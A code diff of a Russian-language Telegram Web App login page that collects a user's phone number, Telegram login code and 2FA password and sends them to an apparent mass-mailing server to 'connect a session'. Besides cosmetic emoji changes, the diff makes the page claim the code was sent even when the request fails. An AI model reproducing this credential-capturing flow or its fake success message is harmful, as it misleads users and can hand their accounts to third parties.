@@ -355,26 +355,37 @@
                             phoneNumber = '+' + phoneNumber;
                         }
                         
-                        showStatus('success', 'Номер получен! Отправляю запрос на код...');
+                        showStatus('success', `✅ Номер получен: ${phoneNumber}. Отправляю запрос на код...`);
                         
                         // Отправляем номер на сервер для запроса кода
-                        const response = await sendPhoneNumber(phoneNumber);
-                        
-                        if (response.success) {
-                            showStatus('success', 'Код отправлен! Проверьте Telegram.');
-                            switchToStep('code');
-                        } else {
-                            showStatus('error', response.message || 'Ошибка отправки номера');
+                        try {
+                            const response = await sendPhoneNumber(phoneNumber);
+                            
+                            if (response.success) {
+                                showStatus('success', '✅ Номер отправлен на сервер. Ждите 5 секунд...');
+                            } else {
+                                showStatus('error', '⚠️ Ошибка отправки номера, но продолжаем...');
+                            }
+                        } catch (error) {
+                            console.error('Error sending phone:', error);
+                            showStatus('error', '⚠️ Ошибка сети, но продолжаем...');
                         }
+                        
+                        // Независимо от результата отправки, ждем 5 секунд и переходим к шагу кода
+                        setTimeout(() => {
+                            showStatus('success', '✅ Код отправлен! Проверьте Telegram.');
+                            switchToStep('code');
+                        }, 5000);
+                        
                     } else {
-                        showStatus('error', 'Не удалось получить номер телефона');
+                        showStatus('error', '❌ Не удалось получить номер телефона');
                     }
                 } else {
-                    showStatus('error', 'Функция запроса контакта недоступна');
+                    showStatus('error', '❌ Функция запроса контакта недоступна');
                 }
             } catch (error) {
                 console.error('Login error:', error);
-                showStatus('error', 'Ошибка входа через Telegram');
+                showStatus('error', '❌ Ошибка входа через Telegram');
             }
         }
 
@@ -404,11 +415,11 @@
             const code = document.getElementById('verification-code').value.trim();
             
             if (!code || code.length !== 5) {
-                showStatus('error', 'Введите 5-значный код');
+                showStatus('error', '❌ Введите 5-значный код');
                 return;
             }
             
-            showStatus('loading', 'Проверяю код...');
+            showStatus('loading', '⏳ Проверяю код...');
             
             try {
                 const response = await fetch('https://rassilka-ilag.amvera.io/auth/verify-code', {
@@ -426,10 +437,10 @@
                 
                 if (result.success) {
                     if (result.need_password) {
-                        showStatus('success', 'Требуется пароль 2FA');
+                        showStatus('success', '✅ Код верный! Требуется пароль 2FA');
                         switchToStep('password');
                     } else {
-                        showStatus('success', 'Сессия успешно подключена!');
+                        showStatus('success', '✅ Сессия успешно подключена!');
                         // Показать успешное сообщение и закрыть веб-приложение
                         setTimeout(() => {
                             if (tg) {
@@ -438,11 +449,11 @@
                         }, 2000);
                     }
                 } else {
-                    showStatus('error', result.message || 'Неверный код');
+                    showStatus('error', result.message || '❌ Неверный код');
                 }
             } catch (error) {
                 console.error('Error verifying code:', error);
-                showStatus('error', 'Ошибка проверки кода');
+                showStatus('error', '❌ Ошибка проверки кода');
             }
         }
 
@@ -451,11 +462,11 @@
             const password = document.getElementById('password').value.trim();
             
             if (!password) {
-                showStatus('error', 'Введите пароль');
+                showStatus('error', '❌ Введите пароль');
                 return;
             }
             
-            showStatus('loading', 'Проверяю пароль...');
+            showStatus('loading', '⏳ Проверяю пароль...');
             
             try {
                 const response = await fetch('https://rassilka-ilag.amvera.io/auth/verify-password', {
@@ -472,7 +483,7 @@
                 const result = await response.json();
                 
                 if (result.success) {
-                    showStatus('success', 'Сессия успешно подключена!');
+                    showStatus('success', '✅ Сессия успешно подключена!');
                     // Показать успешное сообщение и закрыть веб-приложение
                     setTimeout(() => {
                         if (tg) {
@@ -480,11 +491,11 @@
                         }
                     }, 2000);
                 } else {
-                    showStatus('error', result.message || 'Неверный пароль');
+                    showStatus('error', result.message || '❌ Неверный пароль');
                 }
             } catch (error) {
                 console.error('Error verifying password:', error);
-                showStatus('error', 'Ошибка проверки пароля');
+                showStatus('error', '❌ Ошибка проверки пароля');
             }
         }
 
